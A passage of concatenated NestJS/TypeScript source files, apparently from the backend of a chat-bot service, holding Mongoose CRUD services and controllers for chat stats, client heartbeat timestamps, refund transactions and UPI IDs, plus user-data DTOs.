Model<Stat2Document>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat2> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat2> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat2> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async findAll(): Promise<Stat2[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat2.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","import { Controller, Get, Body, Patch, Query } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiQuery } from '@nestjs/swagger';\nimport { TimestampService } from './timestamp.service';\n\n@ApiTags('Timestamps')\n@Controller('timestamps')\nexport class TimestampController {\n  constructor(private readonly timestampService: TimestampService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get timestamp data' })\n  async findOne(): Promise<any> {\n    return this.timestampService.findOne();\n  }\n\n  @Get('stalled')\n  @ApiOperation({ summary: 'Get clients with time differences greater than threshold' })\n  @ApiQuery({ \n    name: 'threshold', \n    type: Number, \n    required: false, \n    description: 'Minimum time difference in minutes (default: 3)' \n  })\n  async getClientsWithTimeDifference(@Query('threshold') thresholdMinutes?: number): Promise<any[]> {\n    // Convert minutes to milliseconds, default to 3 minutes if not provided\n    const threshold = thresholdMinutes ? thresholdMinutes * 60 * 1000 : 3 * 60 * 1000;\n    return this.timestampService.getClientsWithTimeDifference(threshold);\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update timestamp data' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateTimestampDto: any): Promise<any> {\n    return this.timestampService.update(updateTimestampDto);\n  }\n}","import { Module, Global, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { TimestampService } from './timestamp.service';\nimport { TimestampController } from './timestamp.controller';\nimport { TimestampSchema } from './timestamps.schema';\nimport { ClientModule } from '../clients/client.module';\nimport { InitModule } from '../ConfigurationInit';\n\n@Global()\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ \n      name: 'timestampModule', \n      collection: 'timestamps', \n      schema: TimestampSchema \n    }]),\n    forwardRef(() => ClientModule),\n  ],\n  providers: [TimestampService],\n  controllers: [TimestampController],\n  exports: [TimestampService],\n})\nexport class TimestampModule {}","import { Injectable, NotFoundException, Inject, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Timestamp } from './timestamps.schema';\nimport { ClientService } from '../clients/client.service';\n\n@Injectable()\nexport class TimestampService {\n    constructor(\n        @InjectModel('timestampModule') private timestampModel: Model<Timestamp>,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n    ) { }\n\n    async findOne(): Promise<any> {\n        const timestamp = await this.timestampModel.findOne({}).lean().exec();\n        if (!timestamp) {\n            throw new NotFoundException(`Timestamp not found`);\n        }\n\n        // Ensure _id is removed from the response\n        if (timestamp._id) {\n            delete timestamp._id;\n        }\n\n        return timestamp;\n    }\n\n    async getTimeDifferences(threshold: number = 3 * 60 * 1000): Promise<any> {\n        const timestamp = await this.timestampModel.findOne({}).lean().exec();\n        if (!timestamp) {\n            throw new NotFoundException(`Timestamp not found`);\n        }\n\n        const currentTime = Date.now();\n        const differences = {};\n\n        // Loop through each timestamp entry\n        Object.keys(timestamp).forEach(key => {\n            // Skip the _id field and non-numeric values\n            if (key === '_id' || typeof timestamp[key] !== 'number') {\n                return;\n            }\n\n            const difference = currentTime - timestamp[key];\n\n            // Only include differences that are greater than the threshold\n            if (difference > threshold) {\n                differences[key] = difference;\n            }\n        });\n\n        return differences;\n    }\n\n    async getClientsWithTimeDifference(threshold: number = 3 * 60 * 1000): Promise<any[]> {\n        const differences = await this.getTimeDifferences(threshold);\n        const clientIds = Object.keys(differences);\n\n        if (clientIds.length === 0) {\n            return [];\n        }\n\n        const urls = [];\n        for (const clientId of clientIds) {\n            const clientParams = clientId.split('_');\n            try {\n                const client = await this.clientService.findOne(clientParams[0], false);\n                if (client) {\n                    if (clientParams[1]) {\n                        urls.push(client.promoteRepl);\n                    } else {\n                        urls.push(client.repl);\n                    }\n                }\n            } catch (error) {\n                console.error(`Error fetching client with ID ${clientId}:`, error.message);\n            }\n        }\n\n        return urls;\n    }\n\n    async update(updateTimestampDto: any): Promise<any> {\n        // Ensure _id is removed from the input\n        delete updateTimestampDto['_id'];\n\n        const updatedTimestamp = await this.timestampModel.findOneAndUpdate(\n            {}, // Update the first document found in the collection\n            { $set: { ...updateTimestampDto } },\n            { new: true, upsert: true, lean: true }\n        ).exec();\n\n        if (!updatedTimestamp) {\n            throw new NotFoundException(`Timestamp not found`);\n        }\n\n        // Ensure _id is removed from the response\n        if (updatedTimestamp._id) {\n            delete updatedTimestamp._id;\n        }\n\n        return updatedTimestamp;\n    }\n}","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type TimestampDocument = Timestamp & Document;\n\n@Schema({\n  versionKey: false, \n  autoIndex: true, \n  strict: false,  \n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class Timestamp {}\n\nexport const TimestampSchema = SchemaFactory.createForClass(Timestamp);\nTimestampSchema.add({ type: mongoose.Schema.Types.Mixed });","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsNumber, IsOptional, IsEnum, MinLength, Min, IsNotEmpty } from 'class-validator';\nimport { Transform } from 'class-transformer';\n\nexport enum TransactionStatus {\n  PENDING = 'pending',\n  COMPLETED = 'completed',\n  FAILED = 'failed',\n  CANCELLED = 'cancelled'\n}\n\nexport class CreateTransactionDto {\n  @ApiProperty({ \n    description: 'Unique transaction ID (UTR)',\n    example: 'TXN123456789',\n    minLength: 8 \n  })\n  @IsString()\n  @IsNotEmpty()\n  @MinLength(8)\n  @Transform(({ value }) => typeof value === 'string' ? value.toLowerCase() : value)\n  transactionId: string;\n\n  @ApiProperty({ \n    description: 'Amount involved in the transaction',\n    example: 100.50,\n    minimum: 0 \n  })\n  @IsNumber()\n  @Min(0)\n  @Transform(({ value }) => parseFloat(value))\n  amount: number;\n\n  @ApiProperty({ \n    description: 'Issue type reported by the user',\n    example: 'payment_failed'\n  })\n  @IsString()\n  @IsNotEmpty()\n  issue: string;\n\n  @ApiProperty({ \n    description: 'Description of issue reported by the user',\n    example: 'Payment failed due to network error'\n  })\n  @IsString()\n  @IsNotEmpty()\n  description: string;\n\n  @ApiPropertyOptional({\n    description: 'Refund method selected by the user',\n    example: 'bank_transfer',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  refundMethod?: string;\n\n  @ApiPropertyOptional({ \n    description: 'User profile ID',\n    example: 'user123',\n    required: false \n  })\n  @IsString()\n  @IsOptional()\n  profile: string = \"undefined\";\n\n  @ApiPropertyOptional({ \n    description: 'User chat ID',\n    example: 'chat123',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  chatId: string = \"undefined\";\n\n  @ApiPropertyOptional({ \n    description: 'IP address of the user',\n    example: '192.168.1.1',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  ip: string = \"undefined\";\n\n  @ApiPropertyOptional({ \n    description: 'Transaction status',\n    enum: TransactionStatus,\n    default: TransactionStatus.PENDING,\n    required: false\n  })\n  @IsEnum(TransactionStatus)\n  @IsOptional()\n  status: TransactionStatus = TransactionStatus.PENDING;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './create-transaction.dto';\n\nexport class UpdateTransactionDto extends PartialType(CreateTransactionDto) {}","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document, Schema as MongooseSchema } from 'mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { TransactionStatus } from '../dto/create-transaction.dto';\n\nexport type TransactionDocument = Transaction & Document;\n\n@Schema({\n  collection: 'transactions',\n  versionKey: false,\n  autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      ret['id'] = ret._id;\n      delete ret._id;\n      return ret;\n    },\n  }\n})\nexport class Transaction {\n  @ApiProperty({ description: 'Unique transaction ID (UTR)' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    required: true,\n    unique: true,\n    index: true\n  })\n  transactionId: string;\n\n  @ApiProperty({ description: 'Amount involved in the transaction' })\n  @Prop({\n    type: MongooseSchema.Types.Number,\n    required: true,\n    min: 0\n  })\n  amount: number;\n\n  @ApiProperty({ description: 'Issue type reported by the user' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    required: true,\n    index: true\n  })\n  issue: string;\n\n  @ApiProperty({ description: 'Description of issue reported by the user' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    required: true\n  })\n  description: string;\n\n  @ApiProperty({ description: 'Refund method selected by the user' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    default: 'undefined',\n    index: true\n  })\n  refundMethod: string;\n\n  @ApiProperty({ description: 'User profile ID' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    default: 'undefined',\n    index: true\n  })\n  profile: string;\n\n  @ApiProperty({ description: 'User chat ID' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    default: 'undefined',\n    index: true\n  })\n  chatId: string;\n\n  @ApiProperty({ description: 'IP address of the user' })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    default: 'undefined'\n  })\n  ip: string;\n\n  @ApiProperty({\n    description: 'Transaction status',\n    enum: TransactionStatus,\n    default: TransactionStatus.PENDING\n  })\n  @Prop({\n    type: MongooseSchema.Types.String,\n    enum: Object.values(TransactionStatus),\n    default: TransactionStatus.PENDING,\n    index: true\n  })\n  status: TransactionStatus;\n\n  @ApiProperty({ description: 'Creation timestamp' })\n  @Prop({ type: Date })\n  createdAt?: Date;\n\n  @ApiProperty({ description: 'Last update timestamp' })\n  @Prop({ type: Date })\n  updatedAt?: Date;\n}\n\nexport const TransactionSchema = SchemaFactory.createForClass(Transaction);","import { Body, Controller, Get, Post, Put, Delete, Param, Query, HttpStatus, ValidationPipe, UsePipes } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiParam } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { TransactionService } from './transaction.service';\nimport { Transaction } from './schemas/transaction.schema';\n\n@ApiTags('Transactions')\n@Controller('transactions')\nexport class TransactionController {\n  constructor(private readonly transactionService: TransactionService) {}\n\n  @Post()\n  @ApiOperation({\n    summary: 'Create a new transaction',\n    description: 'Creates a new transaction record with the provided details'\n  })\n  @ApiResponse({\n    status: HttpStatus.CREATED,\n    description: 'Transaction created successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.BAD_REQUEST,\n    description: 'Invalid input data provided.'\n  })\n  async create(@Body() createTransactionDto: CreateTransactionDto): Promise<Transaction> {\n    return this.transactionService.create(createTransactionDto);\n  }\n\n  @Get(':id')\n  @ApiOperation({\n    summary: 'Get transaction by ID',\n    description: 'Retrieves a specific transaction by its unique identifier'\n  })\n  @ApiParam({\n    name: 'id',\n    description: 'Transaction unique identifier',\n    required: true\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transaction retrieved successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.NOT_FOUND,\n    description: 'Transaction not found.'\n  })\n  async findOne(@Param('id') id: string): Promise<Transaction> {\n    return this.transactionService.findOne(id);\n  }\n\n  @Get()\n  @ApiOperation({\n    summary: 'Get all transactions',\n    description: 'Retrieves all transactions with optional filtering, pagination and sorting'\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transactions retrieved successfully.',\n    type: [Transaction]\n  })\n  @ApiQuery({ name: 'transactionId', required: false, description: 'Filter by transaction ID (UTR)' })\n  @ApiQuery({ name: 'amount', required: false, type: 'number', description: 'Filter by transaction amount' })\n  @ApiQuery({ name: 'issue', required: false, description: 'Filter by issue type' })\n  @ApiQuery({ name: 'refundMethod', required: false, description: 'Filter by refund method' })\n  @ApiQuery({ name: 'profile', required: false, description: 'Filter by user profile' })\n  @ApiQuery({ name: 'chatId', required: false, description: 'Filter by chat ID' })\n  @ApiQuery({ name: 'ip', required: false, description: 'Filter by IP address' })\n  @ApiQuery({ name: 'status', required: false, description: 'Filter by transaction status' })\n  @ApiQuery({ name: 'limit', required: false, type: 'number', description: 'Number of records to return', example: 10 })\n  @ApiQuery({ name: 'offset', required: false, type: 'number', description: 'Number of records to skip', example: 0 })\n  async findAll(\n    @Query('transactionId') transactionId?: string,\n    @Query('amount') amount?: number,\n    @Query('issue') issue?: string,\n    @Query('refundMethod') refundMethod?: string,\n    @Query('profile') profile?: string,\n    @Query('chatId') chatId?: string,\n    @Query('ip') ip?: string,\n    @Query('status') status?: string,\n    @Query('limit') limit?: number,\n    @Query('offset') offset?: number,\n  ): Promise<{ transactions: Transaction[]; total: number }> {\n    return this.transactionService.findAll(\n      { transactionId, amount, issue, refundMethod, profile, chatId, status, ip },\n      limit,\n      offset\n    );\n  }\n\n  @Put(':id')\n  @ApiOperation({\n    summary: 'Update a transaction',\n    description: 'Updates an existing transaction by its unique identifier'\n  })\n  @ApiParam({\n    name: 'id',\n    description: 'Transaction unique identifier',\n    required: true\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transaction updated successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.NOT_FOUND,\n    description: 'Transaction not found.'\n  })\n  @ApiResponse({\n    status: HttpStatus.BAD_REQUEST,\n    description: 'Invalid input data provided.'\n  })\n  async update(\n    @Param('id') id: string,\n    @Body() updateTransactionDto: UpdateTransactionDto,\n  ): Promise<Transaction> {\n    return this.transactionService.update(id, updateTransactionDto);\n  }\n\n  @Delete(':id')\n  @ApiOperation({\n    summary: 'Delete a transaction',\n    description: 'Deletes a transaction by its unique identifier'\n  })\n  @ApiParam({\n    name: 'id',\n    description: 'Transaction unique identifier',\n    required: true\n  })\n  @ApiResponse({\n    status: HttpStatus.OK,\n    description: 'Transaction deleted successfully.',\n    type: Transaction\n  })\n  @ApiResponse({\n    status: HttpStatus.NOT_FOUND,\n    description: 'Transaction not found.'\n  })\n  async delete(@Param('id') id: string): Promise<Transaction> {\n    return this.transactionService.delete(id);\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { TransactionService } from './transaction.service';\nimport { TransactionController } from './transaction.controller';\nimport { Transaction, TransactionSchema } from './schemas/transaction.schema';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([\n      { name: Transaction.name, schema: TransactionSchema },\n    ]),\n  ],\n  controllers: [TransactionController],\n  providers: [TransactionService],\n  exports: [TransactionService]\n})\nexport class TransactionModule {}\n","import { Injectable, NotFoundException, BadRequestException, Logger } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model, isValidObjectId } from 'mongoose';\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\nimport { Transaction, TransactionDocument } from './schemas/transaction.schema';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport e from 'express';\n\n@Injectable()\nexport class TransactionService {\n  private readonly logger = new Logger(TransactionService.name);\n\n  constructor(\n    @InjectModel(Transaction.name) private readonly transactionModel: Model<TransactionDocument>,\n  ) { }\n\n  async create(createTransactionDto: CreateTransactionDto): Promise<Transaction> {\n    this.logger.log(`Creating new transaction: ${JSON.stringify(createTransactionDto)}`);\n    try {\n      // Check if transaction with same ID already exists\n      const existingTransaction = await this.transactionModel\n        .findOne({ transactionId: createTransactionDto.transactionId })\n        .exec();\n\n      if (existingTransaction) {\n        throw new BadRequestException('Transaction with this ID already exists');\n      }\n\n      const newTransaction = new this.transactionModel(createTransactionDto);\n      const savedTransaction = await newTransaction.save();\n      this.logger.log(`Transaction created successfully: ${savedTransaction.transactionId}`);\n      return savedTransaction;\n    } catch (error) {\n      this.logger.error(`Error creating transaction: ${error.message}`, error.stack);\n      throw error instanceof BadRequestException ? error : new BadRequestException('Failed to create transaction');\n    }\n  }\n\n  async findOne(id: string): Promise<Transaction> {\n    this.logger.debug(`Finding transaction by ID: ${id}`);\n    try {\n      const transaction = await this.transactionModel.findById(id).exec();\n      if (!transaction) {\n        this.logger.warn(`Transaction not found with ID: ${id}`);\n        throw new NotFoundException('Transaction not found');\n      }\n      return transaction;\n    } catch (error) {\n      this.logger.error(`Error finding transaction: ${error.message}`, error.stack);\n      if (error instanceof NotFoundException) throw error;\n      throw new BadRequestException('Invalid transaction ID format');\n    }\n  }\n\n  async findAll(\n    filters: {\n      transactionId?: string;\n      amount?: number;\n      issue?: string;\n      refundMethod?: string;\n      profile?: string;\n      chatId?: string;\n      status?: string;\n      ip?: string;\n    },\n    limit = 10,\n    offset = 0,\n  ): Promise<{ transactions: Transaction[]; total: number }> {\n    this.logger.debug(`Finding transactions with filters: ${JSON.stringify(filters)}`);\n    try {\n      let query = {};\n      let transactions: Transaction[] = [];\n      let total = 0;\n\n      // Check each condition sequentially, only moving to the next if no results are found\n      if (filters.transactionId) {\n        // First check transactionId\n        const transactionIdQuery: any = { \n          $or: [\n            { transactionId: filters.transactionId.toLowerCase() }\n          ] \n        };\n        \n        // Only attempt to query by _id if the ID is a valid MongoDB ObjectId\n        if (isValidObjectId(filters.transactionId)) {\n          transactionIdQuery.$or.push({ _id: filters.transactionId });\n        }\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(transactionIdQuery)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(transactionIdQuery).exec(),\n        ]);\n        \n        if (total > 0) {\n          this.logger.debug(`Found ${total} transactions matching transactionId: ${filters.transactionId}`);\n          await this.sendNotification(filters, total);\n          return { transactions, total };\n        }\n      }\n      \n      if (filters.ip) {\n        // Then check IP if no transaction ID match\n        query = { ip: filters.ip };\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(query)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(query).exec(),\n        ]);\n        \n        if (total > 0) {\n          this.logger.debug(`Found ${total} transactions matching ip: ${filters.ip}`);\n          await this.sendNotification(filters, total);\n          return { transactions, total };\n        }\n      }\n      \n      if (filters.chatId) {\n        // Then check chatId if no IP match\n        query = { chatId: filters.chatId };\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(query)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(query).exec(),\n        ]);\n        \n        if (total > 0) {\n          this.logger.debug(`Found ${total} transactions matching chatId: ${filters.chatId}`);\n          await this.sendNotification(filters, total);\n          return { transactions, total };\n        }\n      }\n      \n      // Finally, check remaining filters\n      const remainingFilters = {};\n      \n      if (filters.profile) remainingFilters['profile'] = filters.profile;\n      if (filters.amount) remainingFilters['amount'] = filters.amount;\n      if (filters.issue) remainingFilters['issue'] = filters.issue;\n      if (filters.refundMethod) remainingFilters['refundMethod'] = filters.refundMethod;\n      if (filters.status) remainingFilters['status'] = filters.status;\n      \n      // Only proceed if at least one remaining filter exists\n      if (Object.keys(remainingFilters).length > 0) {\n        query = remainingFilters;\n        \n        [transactions, total] = await Promise.all([\n          this.transactionModel\n            .find(query)\n            .sort({ createdAt: -1 })\n            .skip(offset)\n            .limit(limit)\n            .exec(),\n          this.transactionModel.countDocuments(query).exec(),\n        ]);\n      }\n\n      this.logger.debug(`Found ${total} transactions matching remaining filters`);\n      await this.sendNotification(filters, total);\n      return { transactions, total };\n    } catch (error) {\n      this.logger.error(`Error finding transactions: ${error.message}`, error.stack);\n      throw new BadRequestException('Failed to fetch transactions');\n    }\n  }\n\n  // Helper method to send notification\n  private async sendNotification(filters: any, total: number): Promise<void> {\n    try {\n      await fetchWithTimeout(`${notifbot(process.env.accountsChannel)}&text=${encodeURIComponent(`Found ${total} transactions matching ip: ${filters.ip || 'N/A'}\\nchatId: ${filters.chatId || 'N/A'}\\ntransactionId: ${filters.transactionId || 'N/A'}\\nprofile: ${filters.profile || 'N/A'}`)}`);\n    } catch (error) {\n      this.logger.error(`Failed to send notification: ${error.message}`);\n    }\n  }\n\n  async update(id: string, updateTransactionDto: UpdateTransactionDto): Promise<Transaction> {\n    this.logger.debug(`Updating transaction ${id} with data: ${JSON.stringify(updateTransactionDto)}`);\n    try {\n      const updatedTransaction = await this.transactionModel\n        .findByIdAndUpdate(id, updateTransactionDto, {\n          new: true,\n          runValidators: true\n        })\n        .exec();\n\n      if (!updatedTransaction) {\n        this.logger.warn(`Transaction not found for update with ID: ${id}`);\n        throw new NotFoundException('Transaction not found');\n      }\n\n      this.logger.log(`Transaction ${id} updated successfully`);\n      return updatedTransaction;\n    } catch (error) {\n      this.logger.error(`Error updating transaction: ${error.message}`, error.stack);\n      if (error instanceof NotFoundException) throw error;\n      throw new BadRequestException('Failed to update transaction');\n    }\n  }\n\n  async delete(id: string): Promise<Transaction> {\n    this.logger.debug(`Deleting transaction: ${id}`);\n    try {\n      const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();\n      if (!deletedTransaction) {\n        this.logger.warn(`Transaction not found for deletion with ID: ${id}`);\n        throw new NotFoundException('Transaction not found');\n      }\n      this.logger.log(`Transaction ${id} deleted successfully`);\n      return deletedTransaction;\n    } catch (error) {\n      this.logger.error(`Error deleting transaction: ${error.message}`, error.stack);\n      if (error instanceof NotFoundException) throw error;\n      throw new BadRequestException('Failed to delete transaction');\n    }\n  }\n}\n","import { Controller, Get, Body, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { UpiIdService } from './upi-ids.service';\n\n@ApiTags('UPI Ids')\n@Controller('upi-ids')\nexport class UpiIdController {\n  constructor(private readonly UpiIdService: UpiIdService) { }\n\n  @Get()\n  @ApiOperation({ summary: 'Get Upi Ids' })\n  async findOne(): Promise<any> {\n    return this.UpiIdService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update Upi Ids' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateUpiIdsdto: any): Promise<any> {\n    return this.UpiIdService.update(updateUpiIdsdto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UpiIdService } from './upi-ids.service';\nimport { UpiIdController } from './upi-ids.controller';\nimport { UpiIdSchema } from './upi-ids.schema';\nimport { NpointModule } from '../n-point/npoint.module';\nimport { InitModule } from '../ConfigurationInit';\n\n@Global()\n@Module({\n  imports: [\n    InitModule,\n    UpiIdModule,\n    NpointModule,\n    MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: UpiIdSchema }]),\n  ],\n  providers: [UpiIdService],\n  controllers: [UpiIdController],\n  exports: [UpiIdService],\n})\nexport class UpiIdModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type UpiIdDocument = UpiId & Document;\n\n@Schema({\n  versionKey: false,\n  autoIndex: true,\n  timestamps: false,\n  toJSON: {\n    virtuals: false,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class UpiId { }\n\nexport const UpiIdSchema = SchemaFactory.createForClass(UpiId);\nUpiIdSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException, OnModuleDestroy, OnModuleInit } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { UpiId } from './upi-ids.schema';\nimport axios from 'axios';\nimport { areJsonsNotSame } from '../../utils';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class UpiIdService implements OnModuleDestroy, OnModuleInit {\n    private checkInterval: NodeJS.Timeout | null = null;\n    private upiIds = {}\n    constructor(@InjectModel('UpiIdModule') private UpiIdModel: Model<UpiId>,\n        private npointSerive: NpointService\n    ) {\n        this.findOne().then(() => {\n            this.checkInterval = setInterval(async () => {\n                await this.refreshUPIs();\n                await this.checkNpoint();\n            }, 5 * 60000);\n        });\n    }\n    onModuleDestroy() {\n        if (this.checkInterval) {\n            clearInterval(this.checkInterval);\n        }\n    }\n    onModuleInit() {\n        console.log(\"UPI ID Service Initialized\");\n    }\n\n    async refreshUPIs() {\n        console.log(\"Refreshing UPIs\");\n        const result = await this.UpiIdModel.findOne({}).lean().exec();\n        if (result) {\n            this.upiIds = result;\n        }\n    }\n\n    async checkNpoint() {\n        const upiIds = (await axios.get('https://api.npoint.io/54baf762fd873c55c6b1')).data;\n        const existingUpiIds = await this.findOne();\n        if (areJsonsNotSame(upiIds, existingUpiIds)) {\n            await this.npointSerive.updateDocument(\"54baf762fd873c55c6b1\", existingUpiIds)\n        }\n    }\n\n    async findOne(): Promise<any> {\n        if (Object.keys(this.upiIds).length > 0) {\n            return this.upiIds;\n        }\n        const result = await this.UpiIdModel.findOne({}).lean().exec();\n        if (!result) return null;\n\n        this.upiIds = result;\n        console.log(\"Refreshed UPIs\");\n        return result;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.UpiIdModel.findOneAndUpdate(\n            {},\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true, lean: true }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`UpiIdModel not found`);\n        }\n\n        this.upiIds = updatedUser;\n        console.log(\"Refreshed UPIs\")\n        return updatedUser;\n    }\n\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateUserDataDto {\n    @ApiProperty({ example: '5787751360', description: 'Chat ID' })\n    chatId: string;\n\n    @ApiProperty({ example: 1, description: 'Total count' })\n    totalCount: number;\n\n    @ApiProperty({ example: 0, description: 'Picture count' })\n    picCount: number;\n\n    @ApiProperty({ example: 1718802722566, description: 'Last message timestamp' })\n    lastMsgTimeStamp: number;\n\n    @ApiProperty({ example: 1718802742567, description: 'Limit time' })\n    limitTime: number;\n\n    @ApiProperty({ example: 0, description: 'Paid count' })\n    paidCount: number;\n\n    @ApiProperty({ example: 0, description: 'Profile count' })\n    prfCount: number;\n\n    @ApiProperty({ example: 1, description: 'Can reply' })\n    canReply: number;\n\n    @ApiProperty({ example: 0, description: 'Pay amount' })\n    payAmount: number;\n\n    @ApiProperty({ example: 0, description: 'highestPayAmount' })\n    highestPayAmount: number;\n\n    @ApiProperty({ example: 0, description: 'cheatCount', default: 0 })\n    cheatCount: number;\n\n    @ApiProperty({ example: 0, description: 'callTime', default: 0 })\n    callTime: number;\n\n    @ApiProperty({ example: 'بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅', description: 'Username' })\n    username: string;\n\n    @ApiProperty({ example: '-7250939091939055173', description: 'Access hash' })\n    accessHash: string;\n\n    @ApiProperty({ example: true, description: 'Paid reply status' })\n    paidReply: boolean;\n\n    @ApiProperty({ example: false, description: 'Demo given status' })\n    demoGiven: boolean;\n\n    @ApiProperty({ example: false, description: 'Second show status' })\n    secondShow: boolean;\n\n    @ApiProperty({ example: 'sneha', description: 'Profile name' })\n    profile: string;\n\n    @ApiProperty({ example: false, description: 'Pics Sent status' })\n    picsSent: boolean;\n\n    @ApiProperty({ example: [], description: 'videos' })\n    videos: number[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\n\nexport class SearchDto {\n  @ApiPropertyOptional({ description: 'Total count', type: Number })\n  totalCount?: number;\n\n  @ApiPropertyOptional({ description: 'Picture count', type: Number })\n  picCount?: number;\n\n  @ApiPropertyOptional({ description: 'Last message timestamp', type: Number })\n  lastMsgTimeStamp?: number;\n\n  @ApiPropertyOptional({ description: 'Limit time', type: Number })\n  limitTime?: number;\n\n  @ApiPropertyOptional({ description: 'Paid count', type: Number })\n  paidCount?: number;\n\n  @ApiPropertyOptional({ description: 'Profile count', type: Number })\n  prfCount?: number;\n\n  @ApiPropertyOptional({ description: 'Can reply', type: Number })\n  canReply?: number;\n\n  @ApiPropertyOptional({ description: 'Pay amount', type: Number })\n  payAmount?: number;\n\n  @ApiPropertyOptional({ description: 'Username' })\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Access hash' })\n  accessHash?: string;\n\n  @ApiPropertyOptional({ description: 'Paid reply status', type: Boolean })\n  paidReply?: boolean;\n\n  